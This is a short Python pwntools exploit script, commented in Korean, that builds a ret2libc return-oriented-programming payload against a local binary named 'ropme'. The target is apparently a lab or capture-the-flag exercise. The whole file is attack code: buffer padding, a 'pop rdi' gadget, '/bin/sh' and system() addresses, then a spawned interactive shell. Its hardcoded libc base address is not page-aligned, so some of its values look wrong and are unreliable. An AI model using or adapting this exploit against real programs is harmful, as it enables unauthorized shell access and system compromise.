from pwn import *

# 설정된 주소들
libc_base = 0x7ffff7da7860  # 계산된 libc base 주소
system_offset = 0x52290  # system() 함수 오프셋
bin_sh_offset = 0x1b45bd  # "/bin/sh" 문자열 오프셋
pop_rdi = 0x4012a3  # "pop rdi; ret" 가젯 주소

# 계산된 실제 주소들
system_address = libc_base + system_offset
bin_sh_address = libc_base + bin_sh_offset

# 버퍼 오프셋 (리턴 주소까지의 패딩)
offset = 40

# 페이로드 생성
payload = b"A" * offset  # 버퍼 패딩
payload += p64(pop_rdi)  # "pop rdi; ret" 가젯
payload += p64(bin_sh_address)  # "/bin/sh" 주소
payload += p64(system_address)  # system() 함수 주소

# 페이로드 출력
print(f"Payload: {payload}")
print(f"pop rdi; ret: {hex(pop_rdi)}")
print(f"/bin/sh address: {hex(bin_sh_address)}")
print(f"system() address: {hex(system_address)}")

# 프로그램 실행 및 페이로드 전달
p = process('./ropme')  # 프로그램 실행
p.sendline(payload)  # 페이로드 전달
p.interactive()  # 인터랙티브 쉘
